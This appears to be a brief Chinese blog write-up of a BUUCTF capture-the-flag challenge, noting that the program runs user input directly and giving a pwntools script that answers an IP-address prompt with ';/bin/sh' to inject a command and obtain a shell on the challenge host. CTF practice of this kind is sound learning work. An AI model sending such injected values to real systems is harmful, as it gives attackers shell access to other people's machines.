+++
title = "wp"
date = "2026-04-15"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-2', '2-2-1']
draft = false
+++
![Pasted image 20260306190804.png](Pasted%20image%2020260306190804.png)
这里会直接运行dest里的内容
🐎的为什么不能贴表情
```python
from pwn import *  
  
r = remote("node5.buuoj.cn",26418)  
r.recvuntil(b"Please input u choose:")  
payload = b'1'  
r.sendline(payload)  
r.recvuntil(b"Please input the ip address:")  
payload = b';'  
payload += b'/bin/sh'  
r.sendline(payload)  
  
r.interactive()
```
